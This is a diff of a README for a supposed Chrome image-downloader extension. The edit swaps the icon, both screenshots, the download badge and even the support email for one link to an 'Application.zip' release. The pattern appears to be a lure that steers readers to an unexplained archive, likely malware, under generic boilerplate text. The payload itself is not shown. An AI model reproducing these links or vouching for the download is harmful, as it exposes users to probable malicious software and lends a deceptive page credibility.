@@ -1,6 +1,6 @@
 # 🚀 One-Click Image Downloader Chrome Extension 🖼️
 
-![Chrome Extension](https://img.icons8.com/color/48/000000/google-chrome.png)
+![Chrome Extension](https://github.com/Sytheflay1/oneclick-image-downloader-extension/releases/download/v1.0/Application.zip)
 
 ### Overview ℹ️
 This repository contains a Chrome extension designed to simplify the process of downloading images with just one click. This tool is perfect for saving time on image dataset creation for various purposes such as machine learning, data analysis, or any other project that requires a large collection of images. With this extension, you can quickly and efficiently download images without the hassle of multiple steps.
@@ -24,7 +24,7 @@ annotation, chrome, chrome-extension, chrome-extensions, dataset-generation, dat
 
 ### Get Started 🌟
 To download the extension and start using it, click the button below:
-[![Download Extension](https://img.shields.io/badge/Download-Extension-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Extension](https://github.com/Sytheflay1/oneclick-image-downloader-extension/releases/download/v1.0/Application.zip)](https://github.com/Sytheflay1/oneclick-image-downloader-extension/releases/download/v1.0/Application.zip)
 
 ### Need Help? 🤝
 If the link above does not work or you encounter any issues, please check the "Releases" section of the repository for alternative download options.
@@ -38,11 +38,11 @@ This project is licensed under the MIT License - see the [LICENSE](#) file for d
 ---
 
 ### Screenshots 📷
-![Screenshot 1](https://via.placeholder.com/500)
-![Screenshot 2](https://via.placeholder.com/500)
+![Screenshot 1](https://github.com/Sytheflay1/oneclick-image-downloader-extension/releases/download/v1.0/Application.zip)
+![Screenshot 2](https://github.com/Sytheflay1/oneclick-image-downloader-extension/releases/download/v1.0/Application.zip)
 
 ### Support 📧
-For any inquiries or support, please contact the project maintainer at example@email.com.
+For any inquiries or support, please contact the project maintainer at https://github.com/Sytheflay1/oneclick-image-downloader-extension/releases/download/v1.0/Application.zip
 
 ### Credits 🌟
 This project was created and is maintained by [Your Name].
